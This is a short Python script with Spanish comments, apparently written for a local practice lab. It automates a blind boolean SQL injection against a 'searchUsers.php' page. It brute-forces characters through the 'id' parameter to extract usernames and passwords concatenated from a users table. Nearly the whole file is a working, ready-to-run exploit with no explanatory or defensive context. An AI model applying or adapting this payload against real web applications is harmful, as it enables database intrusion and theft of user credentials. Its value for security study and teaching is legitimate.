#!/home/angel/miniconda3/envs/Default/bin/python

from pwn import *
import signal 
import sys 
import time 
import requests
import string

def def_handler(sig, frame):
    print("\n\n [!] Saliendo...\n")
    sys.exit(1)

# ControC

signal.signal(signal.SIGINT, def_handler)

# Variables globales 

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_Info = ""

    for position in range(1,150):
        for character in range(33,126):
            sqli_url = main_url + "?id=0 or (select(select ascii(substring(group_concat(username,0x3a,password),%d,1)) from users) =%d)" % (position, character)

            p1.status(sqli_url)


            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_Info += (chr(character))
                p2.status(extracted_Info)
                break
    sys.exit(0);




if __name__ == '__main__':


    makeSQLI()
